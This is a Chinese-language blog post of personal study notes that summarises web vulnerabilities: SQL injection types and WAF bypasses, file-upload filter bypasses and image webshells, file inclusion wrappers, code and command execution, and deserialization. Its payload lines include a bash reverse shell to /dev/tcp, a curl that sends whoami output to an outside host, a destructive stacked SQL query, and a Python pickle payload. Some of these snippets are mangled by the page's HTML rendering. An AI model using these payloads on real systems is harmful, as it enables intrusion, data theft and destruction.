<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="yes" name="apple-touch-fullscreen"><meta content="telephone=no,email=no" name="format-detection"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"><link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon"><link href="https://fonts.googleapis.com/css?family=Rubik" rel="stylesheet"><script src="https://use.fontawesome.com/adaf0e149c.js"></script><link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.6.0/styles/monokai_sublime.min.css"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="/css/post.css"><link rel="stylesheet" href="/css/markdown-github.css"><title>zhang's blog</title><script src="/js/googleAnalytics.js"></script></head><body><div id="postContainer"><div id="postTop"><h4 id="logo">Life Is Short</h4><br><br><h2 id="postTitle">总结注入上传包含和命令执行</h2><br><span aria-hidden="true" class="postTime fa fa-calendar">2019-1-20</span><br><br></div><section id="articleDiv"><p>前言:经过前一阵子的学习，对前面部分的漏洞进行小的总结</p><br><h2 id="web漏洞"><a href="#web漏洞" class="headerlink" title="web漏洞"></a>web漏洞</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>数字型和字符型</p><br><h4 id="根据利用手法不同"><a href="#根据利用手法不同" class="headerlink" title="根据利用手法不同"></a>根据利用手法不同</h4><h5 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h5><h5 id="报错注入-输出报错信息"><a href="#报错注入-输出报错信息" class="headerlink" title="报错注入// 输出报错信息"></a>报错注入// 输出报错信息</h5><h5 id="union联合查询注入"><a href="#union联合查询注入" class="headerlink" title="union联合查询注入"></a>union联合查询注入</h5><p>页面有’显示位’</p><br><p>显示位  ==&gt;  查询的结果，会显示在页面中</p><br><h5 id="基于时间延时的盲注"><a href="#基于时间延时的盲注" class="headerlink" title="基于时间延时的盲注"></a>基于时间延时的盲注</h5><h5 id="内连注入"><a href="#内连注入" class="headerlink" title="内连注入"></a>内连注入</h5><p>select <em> from user where id = ‘1 ‘ bool盲注 and/or ‘a’=’a’ limit 0.1</em></p><br><h5 id="多语句注入-堆叠注入-mssql特有的"><a href="#多语句注入-堆叠注入-mssql特有的" class="headerlink" title="多语句注入/堆叠注入(mssql特有的)"></a>多语句注入/堆叠注入(mssql特有的)</h5><p>select  from user where id = ‘1 ‘;delete from user; #’ limit 0,1</p><br><h4 id="根据sql语句不同"><a href="#根据sql语句不同" class="headerlink" title="根据sql语句不同"></a>根据sql语句不同</h4><h5 id="select"><a href="#select" class="headerlink" title="select"></a>select</h5><h5 id="update"><a href="#update" class="headerlink" title="update"></a>update</h5><h5 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h5><h5 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h5><p>遇到update,delete,insert 推荐使用dnslog</p><br><p>linux系统不能用，windows+mysql 不一定可用，mssql结合exec可用，acess不可用</p><br><h4 id="根据数据库不同"><a href="#根据数据库不同" class="headerlink" title="根据数据库不同"></a>根据数据库不同</h4><h5 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h5><h5 id="aceess"><a href="#aceess" class="headerlink" title="aceess"></a>aceess</h5><p>一般情况下需要判断access还是mssql数据库</p><br><p>and exits(select count(<em>) from sysobjects)&gt;1</em></p><br><p>返回系统错误500，基本确定不是mssql</p><br><p>返回正常数据，是mssql</p><br><p>acess需要猜解表名  exits(select  from tb_name)</p><br><p>里面没有库，因此没有information_schema</p><br><h5 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h5><p>一般情况下需要判断access还是mssql数据库</p><br><p>and exits(select count(<em>) from sysobjects)&gt;1</em></p><br><p>返回正常数据，是mssql</p><br><p>报错注入</p><br><p>(select @@version)&gt;123</p><br><p>会显示version内容</p><br><p>;exec 使用</p><br><h5 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h5><p>类似于mysql</p><br><h4 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h4><p>大小写</p><br><p>空格转 /<em>a</em>/</p><br><p>函数中间加空格</p><br><p>双写</p><br><h4 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h4><h4 id="二次编码"><a href="#二次编码" class="headerlink" title="二次编码"></a>二次编码</h4><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>预编译  php使用pdo  asp写法  select  from user where id = ‘?’ bind id=1</p><br><p>sql注入漏洞根本原因是因为sql语句是由代码拼接组成</p><br><h4 id="mogodb"><a href="#mogodb" class="headerlink" title="mogodb"></a>mogodb</h4><p>php可以传递数组</p><br><p>a[$ne] = sdf</p><br><p>a[$regex] = ^flag$</p><br><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><h4 id="请求头注入"><a href="#请求头注入" class="headerlink" title="请求头注入"></a>请求头注入</h4><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h4><p>js禁用</p><br><h4 id="后端检测"><a href="#后端检测" class="headerlink" title="后端检测"></a>后端检测</h4><h5 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h5><p>尝试截断  // 需要指定保存路径进行配合</p><br><p>解析漏洞</p><br><p>iis 6 a.php;.jpg   a.php/a.jpg  7.5  a.jpg/a.php</p><br><p>nginx a.jpg/a.php</p><br><p>apache a.php.a.b</p><br><h5 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h5><p>加空格</p><br><p>加::$DATA</p><br><p>加.</p><br><p>上传.htaccess</p><br><p>.php3  .phtml .cer .jspx .aspx</p><br><h5 id="内容检测"><a href="#内容检测" class="headerlink" title="内容检测"></a>内容检测</h5><p>制作图片马</p><br><p>copy a.jpg /b + b.php /a hack.php</p><br><p>cat a.php &gt;&gt; b.jpg</p><br><p>winhex编辑</p><br><p>mime类型检测</p><br><p>burp改类型</p><br><h5 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h5><h5 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传"></a>双文件上传</h5><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h4><p>../</p><br><p>包含日志</p><br><p>包含上传的图片</p><br><h4 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h4><p>http://</p><br><p>伪协议</p><br><p>php://input</p><br><p>php://filter/…</p><br><p>data/text/plain,1</p><br><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>eval</p><br><p>assert</p><br><p>preg_replace(‘/adsa/e’,’’,’’)</p><br><p>1’ “  ; phpinfo();</p><br><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>system</p><br><p>分操作系统</p><br><h4 id="linux-amp-amp-amp"><a href="#linux-amp-amp-amp" class="headerlink" title="linux  ; &amp; | || &amp;&amp;"></a>linux  ; &amp; | || &amp;&amp;</h4><p>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;1&amp;</p><br><p>curl <a href="https://www.baidu.com/`whoami`.txt" target="_blank" rel="noopener">https://www.baidu.com/<code>whoami</code>.txt</a></p><br><h4 id="windows-amp-amp-amp"><a href="#windows-amp-amp-amp" class="headerlink" title="windows  || | &amp;  &amp;&amp;"></a>windows  || | &amp;  &amp;&amp;</h4><p>ping + dnslog</p><br><p>powershell 反弹cmd</p><br><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><p>需要审计</p><br><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><p>固定payload,进行命令执行</p><br><p>import os</p><br><p>class abc(project):</p><br><p>def <strong>reduce</strong>(self):</p><br><p>return (os.system,(‘whoami’,))</p><br><h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><p>审计</p>
</section></div><script src="/js/jquery.min.js"></script><script src="/js/highlight.min.js"></script><script src="/js/start.js"></script></body></html>